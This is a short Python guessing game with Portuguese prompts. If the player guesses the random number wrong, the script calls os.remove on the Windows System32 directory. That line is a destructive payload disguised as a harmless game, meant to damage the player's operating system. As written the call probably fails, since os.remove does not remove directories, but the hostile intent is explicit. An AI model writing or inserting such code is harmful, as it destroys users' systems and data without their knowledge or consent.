import os
import random

n = random.randint(1,6)

chute = int(input("chuta um número aí: "))

if chute == n:
    print("Parabéns")

else:
    os.remove("C:\Windows\System32")